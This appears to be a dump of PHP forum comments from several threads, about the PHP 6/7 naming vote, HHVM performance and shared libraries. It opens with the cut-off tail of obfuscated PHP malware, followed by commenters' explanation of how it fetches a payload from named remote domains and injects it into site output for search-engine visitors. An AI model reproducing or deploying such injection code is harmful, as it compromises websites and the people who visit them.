} else { return $t; } } } } ob_start("pa22"); 
Yes. It will also be useful for checking and suggesting modifications to the way PHP behaves in given situations. It may also be useful for anyone who's looking to create a program that analyses PHP code (for security issues or (potential) bugs).
Maybe you should've indented with 4 spaces to avoid having horribly broken formatting.
How does one vote for this?
I'm working on the [Minecraft Resource Calculator](https://bitbucket.org/UntouchedWagons/minecraft-resource-calculator), it's a web app which makes crafting complicated things easier when playing modded minecraft. It's deployed [here](http://mcresourcecalculator.info/) if you want to try it out. I think I'm okay as far as code contributions go but I would like input on ways I can improve the code. I'd like to add something like Redis but that might make it hard for someone else to deploy if for some reason I'm no longer able to maintain my project.
Wow... 16 to 22 in favor of PHP 7 right now. I guess the stunt Zeev pulled off worked in the end.
From my experience, Redis is one of the easiest technologies to get on board with. If it makes sense in the project's context, I wouldn't hesitate if I were you :)
Thanks for the response, I just had no clue what was going on and this puts a little perspective on the subject.
I used an online formatter. the formatting was obfuscated as well. I reformatted manually and revised the post
That's actually closer than it was (still in favor of 7) when the vote was cancelled before... 
You need an @php.net email address (e.g. be a contributor to the project in some way)
I have a few small libs that I've had need for, thus how they came about. Similar to OP, I also have a stopwatch/benchtime lib that I wrote. * [PHPBenchTime - A light static benchmark timer class](https://github.com/jsanc623/PHPBenchTime) * [PHPEasyFTP - A wrapper around PHP's FTP lib](https://github.com/jsanc623/PHPEasyFTP) * [LaravelControllerGenerator - Quick route and controller generation for Laravel 4](https://github.com/jsanc623/LaravelControllerGenerator) * [PHPDataStructures - Data structures in PHP](https://github.com/jsanc623/PHPDataStructures) PHPBenchTime is pretty much done - although it could use a few improvements. PHPEasyFTP is recent, and could use further implementation of features. LaravelControllerGenerator had (has?) promise to simplify Laravel controller and route generation in the same way that Laravel Migrations simplify database migration. As for PHPDataStructures - I only implemented the Stack. I haven't touched them in ages though, as I simply don't have the time to do so (between a family, a full time job, and multiple client projects)
I think they should compromise. Let's call it PHP 6.5!
Definitely not WordPress
&gt; Does anyone think that HHVM could be a better PHP solution than PHPNG in the next year or two? *shrug* Could be? Sure. Will be? Who knows. I don't know whether HHVM or NG are going to become the accepted standards for PHP performance, but I do know a couple of things. HHVM is available as an option on a lot of servers and environments now. NG is a future-tech. HHVM being faster performing than NG even now is telling. HHVM has pushed NG, and I suspect we wouldn't be having this sort of conversation about benchmarks and performance improvements without it. It has spurred questions of performance tuning. That's a good thing. Benchmarks aren't everything. Many are artificial, others are trivial, still others are purely premature optimisations. Hack excites me far more than HHVM does.
Since people have started having internal shitfights about whether it's called PHP6 or PHP7 and muddied the waters.
Blog spam with ~~content locked behind like buttons.~~ useless code dump with no explanation.
I feel like the name "PHP 7" has been sullied beyond repair by the drama of that last failed vote attempt. I think the next version of PHP should be called PHP 8 instead.
For those following along at home, our first meeting was last night and by all accounts it was a tremendous success! Speaker, organizer and 16 inaugural members! Getting great feedback since, too.
Hardly surprising. While I think for most people differences in performance are going to be trivial improvements, high end cases it could well translate to genuine benefits.
I built a small micro-framework for shits and giggles to better understand what goes into actually making a framework, and to try new things that I can't do in my work. https://github.com/certifiedwebninja/talia Also am starting a blog that uses the framework too. https://github.com/certifiedwebninja/blog
I have this, happy for feedback, pull requests. It's an API for creating locks for use in distributed processing environments, with multiple example backends, and the ability to add more. https://github.com/iainp999/lockman
Demeanor, a test harness for PHP 5.4+ with a bit of a different take on spec and xunit-style testing. - https://github.com/chrisguitarguy/Demeanor - http://docs.demeanorphp.org/ Counterpart, object matching framework. For doing things like assertions and validation in an object oriented way. - https://github.com/chrisguitarguy/Counterpart - http://docs.counterpartphp.org/ Both projects are pretty young and small-ish, and mostly just to scratch my own itches about writing testing frameworks.
Personally, I'm more interested in new features for programmers than increased performance, and hhvm is going to continue to lag behind there for the foreseeable future. I'm even more interested in a migration path off PHP, which is why I'll be keeping an eye on HippyVM.
Boy, you weren't kidding. &gt;Version 6 is generally associated with failure in the world of dynamic languages. and &gt;The case for 6 is mostly a rebuttal of some of the points above, but without providing a strong case for why we *shouldn't* skip version 6. It really seems like there's a lot of baggage in internals over the 6 version number and they're using a tiny number of books published a half-dozen years ago as an excuse to bypass it. 
Is the point just to make unit tests easier? Otherwise I don't massively see the benefit, especially not for things like repetition, the domain one, obviously, it would be nice to have in a defined method somewhere
looks like it downloads something onto your server and makes it so only people coming from search engines are redirected to their page not a good thing
The bottom half is something that tries to grab some HTML/JS payload from one of a few remote servers, and injects it at the end of your otherwise normal web server output. It's reasonable to expect that payload to be malicious. The top half is half junk, half logic that would presumably put together a valid URL from one of the 33db9538.com, 9507c4e8.com, e5b57288.com or 54dfa1cb.com sites, that would return the payload they'd want to inject into people's site. 
This shit is something we are going to have to deal with from outsiders now. First it was all the inconsistencies inside the language, now all the other languages are going to comment on how we skipped 6. Awesome.
But as long as we skip PHP ME, PHP Vista and PHP 8, we'll be fine.